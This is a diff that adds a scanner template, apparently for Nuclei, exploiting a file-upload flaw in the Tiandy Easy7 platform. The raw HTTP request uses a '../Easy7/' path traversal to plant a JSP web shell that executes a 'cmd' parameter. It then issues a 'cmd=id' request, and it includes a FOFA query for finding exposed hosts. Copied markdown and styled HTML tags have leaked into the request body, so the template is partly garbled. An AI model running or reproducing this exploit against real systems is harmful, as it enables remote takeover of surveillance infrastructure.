@@ -1,0 +1,54 @@
+id: poc-cmkhush04cqzwt3s
+info:
+  name: 天地伟业Easy7 uploadMapServerBgImage 存在文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cmkhush04cqzwt3s'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cmkhush04cqzwt3s
+    fofa: app="Tiandy-Easy7"
+http:
+- raw:
+  - 'POST /Easy7/rest/file/uploadMapServerBgImage HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Accept: */*
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="uploadParams";
+
+
+    [{"path":"../Easy7/","name":"1.jsp"}]
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="1.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1762685323765-57bc371b-645a-43d4-bfbb-f7ed44b736cb.png)
+
+    **<font style="color:rgb(213, 97, 97);">GET</font>**<font style="color:rgb(53, 54, 57);"> </font><font style="color:rgb(90, 93, 100);">/Easy7/1.jsp?</font>**<font style="color:rgb(210, 105, 0);">cmd</font>**<font style="color:rgb(90, 93, 100);">=</font>**<font style="color:rgb(168, 61, 170);">id</font>**<font style="color:rgb(53, 54, 57);"> </font>**<font style="color:rgb(55, 153, 105);">HTTP/1.1</font>**
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1762685324068-0467fa07-5762-4d77-982a-52dd3bebabd0.png)**<font style="color:rgb(41, 107, 197);">Host</font>**<font style="color:rgb(53, 54, 57);">:</font>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
